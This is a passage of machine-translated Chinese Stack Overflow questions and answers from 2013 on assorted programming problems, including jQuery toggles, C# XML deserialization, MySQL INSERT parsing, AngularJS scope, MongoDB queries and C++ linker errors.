        if ( navwidth == "0px" ) {
          $('div#navigationpanel').css('max-width', '850px');
        } 
        else if ( navwidth == "850px" ) {
          $('div#navigationpanel').css('max-width', '0px');
        }
    });
}); 
```

它确实有效，至少在第一次点击时，但第二次点击按钮时，它应该做相反的事情，再次显示或隐藏 div。但什么也没有发生。

所以要清楚，它适用于第一次点击，但不适用于任何下一次点击

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T09:59:52.837

那是因为您使用的是存储值（在 DOMReady 上）并且您没有更新它，因此仅执行条件块， `css`方法接受一个函数，您可以使用此函数：

```
$(document).ready(function () {
    $('#showhidenav').click(function () {
        $('#navigationpanel').css('max-width', function(i, m){
            return m === '850px' ? '0px' : '850px';  
        })
    });
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T09:58:53.220

采用`.on()`

```
$('div#showhidenav').on('click',function () {
    var navwidth = $('div#navigationpanel').css('max-width');
    if ( navwidth == "0px" ) {
      $('div#navigationpanel').css('max-width', '850px');
    } 
    else if ( navwidth == "850px" ) {
      $('div#navigationpanel').css('max-width', '0px');
    }
}); 
```

放入`navwidth`点击事件调用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T10:02:20.353

您在页面加载时设置变量，而不是在修改 div 时更新它。要解决此问题，您可以检查值而不是使用变量

```
$(document).ready(function () {
    $('div#showhidenav').click(function () {
        if ( $('div#navigationpanel').css('max-width') == "0px" ) {
          $('div#navigationpanel').css('max-width', '850px');
        } 
        else if ( $('div#navigationpanel').css('max-width') == "850px" ) {
          $('div#navigationpanel').css('max-width', '0px');
        }
    });
}); 
```

但是如果你只是想显示和隐藏 div jQuery 有一个内置函数叫做`.toggle()`

```
$(document).ready(function () {
    $('#showhidenav').click(function () {
          $('#navigationpanel').toggle();
    });
}); 
```

对于过渡，您可以指定持续时间和缓动。来自 jquery[文档](http://api.jquery.com/toggle/)

> .toggle( 持续时间 [, 缓动 ] [, 完成 ] )
> 
> ```
> duration (default: 400)
> Type: Number or String
> A string or number determining how long the animation will run.
> 
> easing (default: swing)
> Type: String
> A string indicating which easing function to use for the transition.
> 
> complete
> Type: Function()
> A function to call once the animation is complete. 
> ```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T10:05:22.137

1.  不要使用`tag#id`选择器，只是`#id`，前者让它变慢
2.  缓存你的目标对象
3.  用于`.on()`事件监听
4.  采用`.slideToggle()`

CSS：

```
#navigationpanel {
    max-width: 850px;
} 
```

JS

```
$(document).ready(function () {
    var $nav = $('#navigationpanel');

    $('#showhidenav').on('click', function () { $nav.slideToggle(); });
}); 
```

# c# - 如何读取 XML 到类对象

> ID：15154924
> 
> 赞同：-2
> 
> 时间：2013-03-01T09:57:11.270
> 
> 标签：c#, xml, deserialization

我有一个这样的 XML：

```
<?xml version="1.0" standalone="yes"?>
<DocumentElement>
<Session>
<bIsImages>False</bIsImages>
<bIsPlayMedia>False</bIsPlayMedia>
<bIsSubject>False</bIsSubject>
<bIsVideo>False</bIsVideo>
<dtCreDate>2012-07-23</dtCreDate>
<dtSes_Date1>2001-01-01</dtSes_Date1>
<dtSes_Date2>2001-01-01</dtSes_Date2>
<dtSes_Date3>2001-01-01</dtSes_Date3>
<nClient_ID>32</nClient_ID>
<nDelay>32</nDelay>
<nImage_ID>32</nImage_ID>
<nOperator_ID>32</nOperator_ID>
<nSession_ID>32</nSession_ID>
<nVitality>32</nVitality>
<strDescr>qi stagnatie abq</strDescr>
<strMediaPath></strMediaPath>
<strName>qi stagnatie abq</strName>
<strPrimCause></strPrimCause>
<strSubjectPath>IDF_Eric duBosc.JPG</strSubjectPath>
</Session>
<SessionProgramData>
</SessionProgramData><SessionSubProgramData>
</SessionSubProgramData><SessionTuningData>

  <SessionTuning>
    <SessionTuning_ID>717</SessionTuning_ID>
    <Session_ID>70</Session_ID>
    <Tuning>8285-100</Tuning>
    <TuningDescr>Disturbance by Qistagnatie in general</TuningDescr>
    <TuningIsNegative>true</TuningIsNegative>
    <TuningAddInfo>70</TuningAddInfo>
    <Amp>2.2</Amp>
    <Amp2 />
    <Amp3>0.1</Amp3>
    <Amp4>5.1</Amp4>
    <Amp5>1.0</Amp5>
    <Amp6 />
    <TunFreq>8285-100</TunFreq>
    <TunFreq2 />
    <TunFreq3>8285-100</TunFreq3>
    <TunFreq4 />
    <TunFreq5 />
    <TunFreq6 />
    <Revision2>false</Revision2>
    <Revision3>false</Revision3>
    <Revision4>false</Revision4>
    <Revision5>false</Revision5>
    <Revision6>false</Revision6>
    <AlreadyBalanced>false</AlreadyBalanced>
    <ImagePath />
    <Amp7 />
    <TunFreq7 />
    <Revision7>0</Revision7>
    <Description />
  </SessionTuning>

  ....So on

</SessionTuningData>
<Client>
<nClient_ID>32</nClient_ID>
<strAddress></strAddress>
<strCity></strCity>
<strCountry></strCountry>
<strFirstName>Eric</strFirstName>
<strImage>IDF_Eric duBosc.JPG</strImage>
<strLastName>Bosc</strLastName>
<strMI>du</strMI>
<strNote>ikke</strNote>
<strPhoneNum></strPhoneNum>
<strPostalCode></strPostalCode>
<strState></strState>
<strWorkPhone></strWorkPhone>
</Client>
<SE-5 />
</DocumentElement> 
```

类如下：

```
 public class clsSessionTuningData
    {
        public int nSessionTuning_ID;
        public int nSession_ID;
        public int nTuning_ID;
        public string strTuning;
        public string strTuningDescr;
        public string Description;
        public bool bTuningIsNegative;
        public int nTuningAddInfo;
        public string strAmp;
        public string strAmp2;
        public string strAmp3;
        public string strAmp4;
        public string strAmp5;
        public string strAmp6;
        public string strAmp7;

        public DateTime strRevDate;
        public DateTime strRevDate2;
        public DateTime strRevDate3;
        public DateTime strRevDate4;
        public DateTime strRevDate5;
        public DateTime strRevDate6;
        public DateTime strRevDate7;

        public string strTunFreq;
        public string strTunFreq2;
        public string strTunFreq3;
        public string strTunFreq4;
        public string strTunFreq5;
        public string strTunFreq6;
        public string strTunFreq7;
        public bool bRevision2;
        public bool bRevision3;
        public bool bRevision4;
        public bool bRevision5;
        public bool bRevision6;
        public bool bRevision7;
        public bool bAlreadyBalanced;
        public string strImagePath;
    } 
```

那么如何获取对象`<SessionTuningData>`数组中每个标签的值`clsSessionTuningData`。？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T10:06:08.940

您需要将您的类标记为可序列化。

我本来希望某些`[XmlElement]`属性至少会出现在任何阅读过任何教程的人的代码中。

[像这个](http://tech.pro/tutorial/798/csharp-tutorial-xml-serialization)

```
public class Movie
{
  [XmlElement("MovieName")]
  public string Title
  { get; set; }

  [XmlElement("MovieRating")]
  public float Rating
  { get; set; }

  [XmlElement("MovieReleaseDate")]
  public DateTime ReleaseDate
  { get; set; }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T10:06:52.373

您可以使用像 xsd.exe 这样的工具来创建一个 xsd 文件，然后您可以从这里使用序列化

[http://snipplr.com/view/2660/](http://snipplr.com/view/2660/)

它可能不会创建完全相同的 xml，但它会很接近......

顺便说一句，使用 newtonsoft json 序列化为 json 而不是 xml 可能更容易

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T10:10:20.233

有很多方法可以做到这一点。

1.  用 xml 属性装饰你的类属性（例如：XmlElement、XmlAttribute）（[http://www.codeproject.com/Articles/14064/Using-the-XmlSerializer-Attributes](http://www.codeproject.com/Articles/14064/Using-the-XmlSerializer-Attributes)）

2.  实施 IXmlSerializable ( [http://www.codeproject.com/Articles/43237/How-to-Implement-IXmlSerializable-Correctly](http://www.codeproject.com/Articles/43237/How-to-Implement-IXmlSerializable-Correctly) )

3.  或使用 DataContractSerializer ( [http://msdn.microsoft.com/en-us/library/system.runtime.serialization.datacontractserializer.aspx](http://msdn.microsoft.com/en-us/library/system.runtime.serialization.datacontractserializer.aspx) )

# vba - 使用 excel VBA 查找单元格值，并根据该单元格返回多个值

> ID：15154925
> 
> 赞同：1
> 
> 时间：2013-03-01T09:57:14.103
> 
> 标签：vba, excel

抱歉标题很糟糕，我不知道如何总结我的问题。

我有一张包含一堆付款的工作表。每次付款都支付给一个 ID 号。我有另一个工作表，上面有 ID 号及其细分；应分配给每个底池的付款百分比。

例如

```
Client XYZ ,100 payment in worksheet one, has ID 123. 
```

工作表 2 有，

```
123 | A | 5%
 23 | B | 95%  and so on 
```

我希望能够生成表格的第三张工作表。

```
XYZ, 123, A, $5
XYZ, 123, B, $95 
```

因此，每笔付款都乘以其细分，并与相邻列中的其他客户信息一起显示在另一张纸上。

即使只是一个开始也会非常有帮助。非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T10:09:56.190

通过阅读您的问题，您似乎只想执行一个简单的查找。

如果您不需要使用 VBA，您可以[使用 excel 的 VLOOKUP 函数](http://www.techonthenet.com/excel/formulas/vlookup.php)轻松完成此操作。

# javascript - 删除图像后如何在画布中显示图像宽度、高度和角度值

> ID：15154931
> 
> 赞同：2
> 
> 时间：2013-03-01T09:57:35.267
> 
> 标签：javascript, asp.net-mvc-3, html5-canvas

大家好，我是 html5 画布的新手，因为我想知道是否有可能在调整大小和旋转时获取图像高度、宽度和角度值。显示我想要的图像。![图片](../Images/2e75277c72789910565b98cf50b6d545.png) 我希望在进入画布后进行该过程，因为我在谷歌搜索这个找不到相关答案几乎每个人都在画布中显示要保存在代码中的图像位置，但我希望图像应该通过单击自动显示其值在尺寸按钮上。提前谢谢任何帮助都会很棒。

图像应根据图像在画布中显示其尺寸，例如图像是否更改（或自动调整大小或旋转尺寸应使用按钮单击功能更改）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T11:21:59.600

您可以通过以下方式玩画布

```
 <canvas id="myCanvas">Your browser does not support the canvas tag.</canvas>
<script type="text/javascript">

    var canvas = document.getElementById('myCanvas');
    var ctx = canvas.getContext('2d');

    // Draw blue rectangle
    ctx.fillStyle = '#0065BD';
    ctx.fillRect(0, 0, 125, 75);

    // Draw white X
    ctx.beginPath();
    ctx.lineWidth = "15";
    ctx.strokeStyle = "white";
    ctx.moveTo(0, 0);
    ctx.lineTo(125, 75);
    ctx.moveTo(125, 0);
    ctx.lineTo(0, 75);
    ctx.stroke();

</script> 
```

希望这对您有所帮助。

# c++ - 尝试在 code::blocks 中使用 ogre 的基本教程会产生对 '__unwind_resume' 和 '__gxx_personality_v0' 的未定义引用

> ID：15154939
> 
> 赞同：1
> 
> 时间：2013-03-01T09:57:47.610
> 
> 标签：c++, boost, compiler-errors, ogre

遵循[本](https://wiki.ogre3d.org/tiki-index.php?page=Setting%20Up%20An%20Application%20-%20CodeBlocks#Setting_up_Code::Blocks_MinGW_for_OGRE_Development)教程时，我收到以下错误：未定义引用 '__unwind_resume' 和未定义引用 '__gxx_personality_v0'

产生这些未定义参考错误的文件是 libboost_system-mgw47-mt-1_51.a。我已经尝试了以下修复无济于事：

1.  强制 Code::blocks 使用 g++ 而不是 gcc。结果：没有变化

2.  将-lstdc++ 添加到链接器链接到的库列表中。结果：除了 __unwind_resume 和 __gxx_personality_v0 未定义的参考错误之外，还有 39 个错误。 [![图像1](../Images/28f1d4635632ecde6dce2fc1a885b1a2.png)](https://i.stack.imgur.com/lsOUn.jpg)

3.  安装最新的 MingW 并指向我的编译器使用它而不是它自己的版本结果：编译器错误现在超过最大值:( [image2 http://s24.postimage.org/3u6tik4dh/moreerrors2.jpg](http://s24.postimage.org/3u6tik4dh/moreerrors2.jpg)

感谢您对解决这些错误的任何帮助，我真的很想让这件事正常工作。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-04T10:28:16.360

我找到了解决方案的一部分，我让编译器创建一个可执行文件，但它当前抛出 OGRE::filenotfoundexception 并终止。我通过下载 boost_1_53_0 并构建 libboost_system-mgw47-mt-1-53.a 并链接到它而不是另一个来做到这一点，然后它在启动时给了我错误“程序入口点 __gxx_personality_v0 无法位于动态链接库 libstdc++-6.dll。” 因此，为了解决这个问题，我去了 orwell 的 mingw 文件夹，发现该文件夹中的 libstdc++-6.dll 大小约为 800 KB，而使用的一个代码块是 5 mb，我将它们切换出来看看它是否有效并且得到了可执行文件现在正在运行，但它抛出所述异常并终止。

EDIT1：奇怪的是，只需添加一个名为 resources.cfg 的空白文件（导致异常的文件）即可导致程序运行，但现在出现一个 Ogre 窗口，要求提供渲染系统

EDIT2：在意识到我应该将所有内容从 ogre 的 bin/release 目录复制到我的可执行文件目录（以及将媒体目录复制到我的可执行文件目录中的 2 个文件夹）之后，我做到了，一切终于完美运行！

# ios - 本地化的 ipad .nib 文件不起作用

> ID：15154940
> 
> 赞同：0
> 
> 时间：2013-03-01T09:57:47.990
> 
> 标签：ios, ipad, localization, xib, nib

我有一个我正在尝试将其转换为通用的 iPhone 应用程序。

我有一个 viewController，它有 2 个本地化的 .xib（英语和西班牙语）文件，效果很好。

现在为了也以 iPad 为目标，我创建了一个 viewController~ipad.xib 文件，每当我在 iPad 上运行应用程序时，该文件都会正确加载。

当我尝试本地化 .xib 文件并创建英语和西班牙语版本时，问题发生了，就像我为他的 iPhone 所做的那样。

现在，每当我在 iPad 上运行该应用程序时，我都没有获得 ipad .xib，而是将 iphone 显示在屏幕上！

有任何想法吗？

*我不是以编程方式选择要运行的 .xib 文件（对于 iphone 和 ipad），我只有我的文件，例如：

```
controller.xib

controller~ipad.xib 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T10:26:44.137

显然xCode需要重新启动..

我多次尝试清理项目，但没有帮助。

重启后一切正常。

# android - 关闭屏幕时按下电源键并检测音量键

> ID：15154948
> 
> 赞同：-2
> 
> 时间：2013-03-01T09:58:37.437
> 
> 标签：android

正如标题，我有两个问题： 1.挂钩电源键-我需要检测和防止电源键。2.当屏幕关闭时，我需要处理事件敌人音量，菜单，返回键按下。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-03-01T10:24:32.870

[KeyEvents stackoverflow](https://stackoverflow.com/questions/4171949/where-how-to-use-onkey-onkeydown-onkeypressed-event-in-android)这个链接让你知道如何处理 onKeyUp/Down 事件。

对于返回键检测使用 KEYCODE_BACK

对于音量键，使用 KEYCODE_VOLUME_DOWN 和 KEYCODE_VOLUME_UP

[关键事件列表](http://developer.android.com/reference/android/view/KeyEvent.html)

[检测菜单按钮](https://stackoverflow.com/questions/4239880/detecting-physical-menu-key-press-in-android)

按下电源按钮时会调用活动的 OnStop() 生命周期方法。

# java - Spring Framework中通过XML配置的声明性事务的澄清请求

> ID：15154950
> 
> 赞同：0
> 
> 时间：2013-03-01T09:58:38.510
> 
> 标签：java, spring, spring-mvc, spring-aop, spring-transactions

我正在阅读这篇文章通过 XML 配置学习 Spring 声明式事务： [http ://www.tutorialspoint.com/spring/declarative_management.htm](http://www.tutorialspoint.com/spring/declarative_management.htm)

在这种情况下，我只能很好地理解 AOP 是如何工作的，在我的**Beans.xml**配置文件中，我有：

```
 <tx:advice id="txAdvice"  transaction-manager="transactionManager">
      <tx:attributes>
      <tx:method name="create"/>
      </tx:attributes>
   </tx:advice>

   <aop:config>
      <aop:pointcut id="createOperation" 
      expression="execution(* com.tutorialspoint.StudentJDBCTemplate.create(..))"/>
      <aop:advisor advice-ref="txAdvice" pointcut-ref="createOperation"/>
   </aop:config> 
```

那么，这个配置究竟意味着什么？

我认为这可以通过以下方式工作（但我不确定）：

要应用的事务语义封装在定义中，我认为在这种情况下，只需指定在 StudentDAO 接口中定义的**create** **()**方法必须是事务行为（对吗？）

 **关于**aop:config**标记内容的含义，我认为只有确保上述事务性建议适用于任何 com.tutorialspoint.StudentJDBCTemplate.create() 方法的执行

这样对吗？还是我错过了什么？

肿瘤坏死因子

安德烈亚

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-18T12:40:50.873

你说的对，

`aop:pointcut`将找出应应用建议的所有连接点，使用`tx:advice`.

还提供了额外的标签来使用带有方法属性`tx:advice`的标签来过滤掉这些连接点。`tx:method`

在上面提到的例子中，

切入点将只找到一个连接点，`tx:advice`并将过滤掉具有`tx:method`name 属性的连接点并应用指定的配置。在示例中将使用默认配置值。**

# java - 注入组件之间的通信

> ID：15154951
> 
> 赞同：0
> 
> 时间：2013-03-01T09:58:42.773
> 
> 标签：java, spring, dependency-injection, communication

我的应用程序在 MVC 中包含一个 UI，其中包含几个通过 spring 注入的控制器。一些控制器正在创建事件，例如登录到数据连接。所有其他控制器都依赖于这些事件，因此需要通知它们。

在这些注入的组件之间使用轻量级通信的正确方法是什么？我研究了 Spring Integration，但它似乎有点矫枉过正。像 ActiveMQ 这样的消息系统也不适合这项任务，因为应用程序应该是一个独立的客户端。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T11:47:42.223

您是否尝试过`@Async` [25.5.2 @Async 注解](http://static.springsource.org/spring/docs/3.0.x/reference/scheduling.html)？

# php - 意外的 INSERT ... SET 查询行为

> ID：15154953
> 
> 赞同：9
> 
> 时间：2013-03-01T09:58:48.560
> 
> 标签：php, mysql, sql, sql-insert

我有一个表，我需要存储另一个表中的两个 id。在进行一些调试时，我注意到 SQL 的一些奇怪行为。

错误的sql示例：

```
INSERT INTO follower_list set `followerUserId` = '3' AND `followingUserid` = '4' 
```

上面的查询是在 DB 中插入零作为值。我仔细研究了查询，并意识到我犯了一个错误，`and`将`,`. 我需要实现我的目的的真正查询是：

```
INSERT INTO table SET col1 = '3' , col2 = '4' 
```

这正如我预期的那样工作。我的问题与第一个（不正确的）查询有关 - 因为它执行并且在语法上是正确的，所以会在哪里使用类似的查询？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-01T10:01:01.167

该`INSERT`语句不产生语法错误并且它也可以工作的原因是因为`MySQL`隐式（*我不喜欢 MySQL 中的一件事`:D`*）将该语句解析为布尔表达式。

在您的`INSERT`语句中，只有`followerUserId`列是*可更新*的，因为其余列是布尔表达式的一部分。查询被评估为：

```
INSERT INTO follower_list SET followerUserId = ('3' and (followingUserid='4')) 
```

*   [SQLFiddle 演示（*SELECT 语句*）](http://www.sqlfiddle.com/#!2/1d82c/1)

这里：

```
followerUserId = ('3' and (followingUserid='4')) // assuming followingUserid <> 4
followerUserId = ('3' and (0))
followerUserId = 0 
```

其他，

```
followerUserId = ('3' and (followingUserid='4')) // assuming followingUserid = 4
followerUserId = ('3' and (1))
followerUserId = 1      // will only return zero if one of the values is zero 
```

# c++ - MFC 打开图像并在优化校准中显示

> ID：15154954
> 
> 赞同：2
> 
> 时间：2013-03-01T09:58:48.873
> 
> 标签：c++, visual-c++, mfc

有人可以帮我在运行时在优化校准中显示图像吗？我想要做的是使用打开对话框打开图像（.bmp、.jpg、.png 等）并将其显示在图片控件中。很好的教程受到高度赞赏。

谢谢

# scope - 如何从父范围获取嵌套模型？

> ID：15154955
> 
> 赞同：0
> 
> 时间：2013-03-01T09:58:48.713
> 
> 标签：scope, angularjs

html代码：

```
<body ng-controller="MainCtrl">
  <h1>Outer: {{aaa.bbb}}</h1>
  <div ng-controller="InnerCtrl">
    <h1>Inner1: {{$parent['aaa']}}</h1>
    <h1>Inner2: {{$parent['aaa.bbb']}}</h1>
  </div>
</body> 
```

Angularjs 代码：

```
app.controller('MainCtrl', function($scope) {
  $scope.aaa = {
    bbb:'Freewind'
  }
});

app.controller('InnerCtrl', function($scope){
}); 
```

呈现的 html 将是：

```
Outer: Freewind

Inner1: {"bbb":"Freewind"}

Inner2: 
```

可以看到`Inner2:`是空的。

我该如何展示它？

这是一个现场演示：[http ://plnkr.co/edit/7IfxgsNCaUpKH9HOpr26?p=preview](http://plnkr.co/edit/7IfxgsNCaUpKH9HOpr26?p=preview)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T10:23:44.513

`InnerCtrl`范围从其父范围（范围）继承属性，因此`MainCtrl`您可以直接访问这些属性：

```
<div ng-controller="InnerCtrl">
    <h1>Inner1: {{aaa}}</h1>
    <h1>Inner2: {{aaa.bbb}}</h1>
</div> 
```

# html - 悬停问题。HTML 和 CSS

> ID：15154956
> 
> 赞同：2
> 
> 时间：2013-03-01T09:58:50.430
> 
> 标签：html, css

问题：这个想法是在悬停时改变其内容颜色的 div。除了文本和图像（精灵）颜色在不同点发生变化；悬停在“地址”div 上方的文本和“addressicon”div 上方的图像。有谁知道我怎样才能在将鼠标悬停在“地址”div 上时让两者都发生变化。

HTML：

```
<section id="gallery">
    <div class="container" style="padding-top:40px;">

        <div class="address"><div class="title"><span>Address</span></div><br>
            <div class="addressicon"></div>
            <p><br>Address1<br>
            Address2<br>
            Address3<br>
            Area<br>
            City<br>
            PostCode
            </p>
        </div>

        <div style="width:33%;height:400px;display:inline-block;background-color:#000000"></div>
        <div style="width:33%;height:400px;display:inline-block;background-color:#000000"></div>

    </div>
  </section> 
```

CSS：

```
.address {
width:33%;
height:400px;
display:inline-block;
background-color:#CCC;
color:#bcb7af;}

.address:hover {color:#000000;}

.address span {
color:#bcb7af;
align:center;
font-size:24px;
width:100%;}

.address:hover span {
color:#000000;}

.title {text-align:center;}

.addressicon {
background: url(../images/address.png) bottom;
width:202px;
height:130px;
margin: 0px auto;}

.addressicon:hover {
background-position: 0 0;} 
```

**非常感谢**

**问题解决了新的 CSS：**

```
.address > .addressicon {
    background: url(../images/address.png) bottom;}

.address:hover > .addressicon, {
    background-position: 0 0;} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T10:07:50.237

```
.address:hover > .addressicon {
    color: SOMETHING;
} 
```

永远不要`div`留空。放入`&nbsp;`其中，以防止其做出愚蠢的行为。

# javascript - 如何将字符串转换为对象？

> ID：15154958
> 
> 赞同：1
> 
> 时间：2013-03-01T09:58:55.837
> 
> 标签：javascript, node.js, mongodb, dereference, node-mongodb-native

我有这段代码：

```
var regex={"$regex":req.query.query,"$options":req.query.options }  

db.collection('coders', function(err, collection) {
    collection.find(

    {"name":regex}

    ).toArray(function(err, items) {
    res.send(items);
    });

}); 
```

它按预期工作得很好。现在我希望能够使用任意字段而不是“名称”，所以我测试了这个：

```
 var regex={"$regex":req.query.query,"$options":req.query.options }

    var field="\"notName\""

db.collection('coders', function(err, collection) {
    collection.find(

    {field:regex}

    ).toArray(function(err, items) {
    res.send(items);
    });

}); 
```

这是行不通的。问题是什么？用变量调用 collection.find() 的正确方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T10:01:28.497

您必须`find`使用方括号表示法在调用之外构建参数对象：

```
var toFind = {};
toFind[field] = regex;

db.collection('coders', function(err, collection) {
    collection.find(toFind).toArray(function(err, items) {
        res.send(items);
    });
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T10:02:55.170

试试这个变种

```
var regex={"$regex":req.query.query,"$options":req.query.options }
var field="notName";
db.collection('coders', function(err, collection) {
        var findExpression = {};
        findExpression[field]=regex;
        collection.find(findExpression).toArray(function(err, items) {
        res.send(items);
        });
}); 
```

# php - 在php中验证加密文本中的额外字母

> ID：15154963
> 
> 赞同：0
> 
> 时间：2013-03-01T09:59:06.147
> 
> 标签：php

这是我在 php 中使用加密和解密的方法。

```
function ecrypt($str){
     $key = "ABCDEH";
     for($i=0; $i<strlen($str); $i++) {
          $char = substr($str, $i, 1);
          $keychar = substr($key, ($i % strlen($key))-1, 1);
          $char = chr(ord($char)+ord($keychar));
          $result.=$char;
       }
    return base64_encode($result);
 }

 function decrypt($str){
    $str = base64_decode($str);
    $result = '';
    $key = "ABCDEH";
  for($i=0; $i<strlen($str); $i++) {
     $char = substr($str, $i, 1);
     $keychar = substr($key, ($i % strlen($key))-1, 1);
     $char = chr(ord($char)-ord($keychar));
     $result.=$char;
  }
 return $result; 
```

}

加密文本可能包含名称和到期日期。如果我的加密文本是：

`1yUoaCToqmsqq+4unuFdXWJc4R5hnmL`

我将解密并计算到期日期，但问题是用户是否输入`1yUoaCToqmsqq+4unuFdXWJc4R5hnmLL`（我在加密密钥的末尾添加了额外的一个字母）。

如果我解密它并检查到期日期，它也可以工作。如果有额外的字母，我应该抛出错误消息。

请给我建议。

# .net - 如何在通过.net调用存储过程之前压缩数据表列？

> ID：15154965
> 
> 赞同：0
> 
> 时间：2013-03-01T09:59:17.697
> 
> 标签：.net, sql-server, tsql, datatable, dataset

我正在将 .net 客户端写入远程 sql server 2012 数据库。客户端通过调用以*表值参数*作为输入的*存储过程来工作。*客户端通过创建 .net 数据表调用这些存储过程*，*然后将这些数据表作为参数 ( ) 传递。然后在我调用时将数据表传输到 sql 服务器。这些数据表的一列包含文件路径，它们是**`SqlCommand.Paramters.AddWithValue()``dataAdapter.Fill(dataset)``nvarchar(max)`. 这会使数据表变得非常大。这是一个严重的瓶颈，因为 sql server 位于世界的另一端。我的问题是：是否有可能以某种方式压缩文件路径，以尽量减少通过 Internet 传输的数据量？我应该在什么级别进行此压缩？还是已经自动完成了一些压缩？注意：我说的是列，但当然可以压缩整个数据表。谢谢**

 *** * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T22:13:42.443

您对远程服务器有任何控制权吗？您可以更改存储过程吗？

我认为没有支持压缩的内置连接类型（尽管可以[自己编写](https://stackoverflow.com/a/2454011/8262)），但如果您能够修改您的方法，您可以通过 SQL CLR 轻松支持您的要求......

*   将目标存储过程更改为接受 varbinary(max) 而不是表
*   让您的 .NET 客户端对数据进行编码和压缩（可能是 json？），然后调用 sproc，将其作为二进制有效负载传递
*   让目标存储过程解压缩并将二进制文件解码为表（通过 SQL CLR）
*   ...并像以前一样继续**

# wordpress - WordPress 根据 ID 隐藏页面编辑器？

> ID：15154969
> 
> 赞同：2
> 
> 时间：2013-03-01T09:59:29.167
> 
> 标签：wordpress

有没有办法根据页面 ID 在页面上隐藏帖子编辑器所见即所得？

我有一些自定义元框，在这个特定页面上不需要它..

我已经尝试了以下但它没有做任何事情，页面的 id 为 75 但它仍然显示？

```
function remove_pages_editor(){
  if(get_the_ID() == 75) {
     remove_post_type_support( 'post', 'editor' );
  } // end if
 } // end remove_pages_editor
add_action( 'add_meta_boxes', 'remove_pages_editor' ); 
```

有任何想法吗..？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T11:25:51.653

这可以通过较早的钩子来完成，[`do_action('load-' . $page_hook);`](http://core.trac.wordpress.org/browser/tags/3.5.1/wp-admin/admin.php#L147).

```
add_action( 'load-post.php', 'hide_specific_editor_so_15154969' );

function hide_specific_editor_so_15154969()
{
    if( '75' == $_GET['post'] && 'edit' == $_GET['action'] )
        remove_post_type_support( 'post', 'editor' );
} 
```

# php - file_get_contents 和 file_put_contents 的 FTP 超时

> ID：15154975
> 
> 赞同：2
> 
> 时间：2013-03-01T09:59:42.597
> 
> 标签：php, file, ftp, timeout, file-get-contents

我正在尝试使用在 ftp 服务器上附加文件

```
file_put_contents("ftp://".$ftp_user_name.":".$ftp_user_pass."@".$ftp_server."/".$destFile, $outputStr, FILE_APPEND) 
```

这工作正常，但需要很长时间才能在失败时生成超时。我想设置在 FTP 上附加文件的超时时间。我查看了支持 FTP 协议但找不到连接超时选项的 stream_context_create() ，就像它用于 HTTP 协议一样。为 file_put_contents 或 file_get_contents 设置超时的另一种方法是什么

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-01T19:11:26.143

也许这会有所帮助？

```
ini_set("default_socket_timeout", $seconds); 
```

# android - 在 android 地图上布局

> ID：15154979
> 
> 赞同：0
> 
> 时间：2013-03-01T09:59:58.937
> 
> 标签：android, map, overlay

有没有办法在女巫的谷歌地图上添加某种叠加层，我将显示带有标记信息的新布局，布局不应该是全屏的。

我需要在地图上显示有关标记的信息，当您越过标记并看到一个显示图片和一些文本的新框架时，我希望它类似于谷歌地球上的内容。

# c++ - 链接器错误：未定义对 vtable 的引用

> ID：15154980
> 
> 赞同：2
> 
> 时间：2013-03-01T09:59:59.630
> 
> 标签：c++, gcc, linker-errors

我希望你能帮我解决我的问题，这个节目是一个剧院预订节目。

主文件

```
{
#include <cstdlib>
#include <iostream>
#include "headerMachine.h"

using namespace std;

int main(int argc, char *argv[])
{
    Machine machineCall;
    Movies moviesCall;

    machineCall.menu();
    moviesCall.chooseMovie();

    system("pause");
    return 0;
} 
```

头文件.h

```
 #include <string>
#include <iostream>
using namespace std;

class Machine
    {
        public:
            void menu(); //
            virtual void reserveSeats();
            virtual void availableSeats();
            void ticketSales();

        private:
            int task;
        };

class Movies: public Machine
    {
        public:
            void chooseMovie(); //
            void setTitle();
            void timeSlot();
            void receipt();

            //Inheritance
            void reserveSeats();//
            void availableSeats();

        protected:
            int chosenMovie;
            int rowNum;
            int seatNum;
            int seatsThHo[10][10];
            int seatsROG[10][10];
            int seatsHoTr[10][10];

        }; 
```

小鬼.cpp

```
 #include <cstdlib>
#include <iostream>
#include "headerMachine.h"

using namespace std;
const char RESERVED = '*';
const char VACANT = 'o';

void Machine::menu()
{
    cout<<"\n  [1]Reserve Seats  ";
    cout<<"\n  [2]Available Seats  ";
    cout<<"\n  [3]View Ticket Sales  ";
    cout<<"\n  [0]Exit  ";
    cout<<"\n\nChoose task number: ";
    cin>>task;
}
void Movies::chooseMovie()
{
    cout<<"\n [1]The Hobbit ";
    cout<<"\n [2]Rise of the Guardians ";
    cout<<"\n [3]Hotel Transylvania ";
    cout<<"\n [0]Back ";
    cout<<"\n\n From what movie: ";
    cin>>chosenMovie;

}

void Movies::reserveSeats()
{
    cout<<"\nEnter row #: ";
    cin>>rowNum;
    cout<<"\nEnter seat#: ";
    cin>>seatNum;

    for(int i=0; i<10; i++)
    {
        for(int j=0; j<10; j++)
        {
            seatsThHo[i][j] = VACANT;
            seatsROG[i][j] = VACANT;
            seatsHoTr[i][j] = VACANT;
            }
        }
    switch(chosenMovie)
    {
        case 1:
            {
            cout<<"\nYou wanted to buy ticket from the movie 'The Hobbit': ";
